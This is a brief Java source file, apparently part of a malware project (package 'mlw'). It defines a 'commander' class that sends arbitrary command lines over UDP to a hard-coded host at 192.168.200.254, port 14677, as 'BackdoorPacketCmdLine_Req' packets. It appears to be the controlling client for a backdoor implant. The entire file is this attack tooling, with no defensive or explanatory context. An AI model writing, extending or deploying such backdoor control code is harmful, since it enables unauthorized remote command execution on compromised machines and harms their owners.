package mlw;

import java.io.IOException;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.net.SocketException;
import java.net.UnknownHostException;
import java.nio.charset.Charset;

public class MlwCommander
{
	byte[] IP = { (byte) 192,(byte) 168,(byte) 200,(byte) 254 };
	InetAddress address ;
	DatagramSocket datagramSocket ;
	
	public MlwCommander() throws Exception
	{
		datagramSocket = new DatagramSocket();
		address = InetAddress.getByAddress(IP);
	}
	
	public void runCommand(String command) throws Exception
	{
	    byte[] buffer = ("BackdoorPacketCmdLine_Req "+command).getBytes(Charset.forName("ASCII"));
		
		DatagramPacket packet = new DatagramPacket(
		        buffer, buffer.length, address,14677
		        );
		
		datagramSocket.send(packet);
		
		Thread.sleep(300);
	}

}
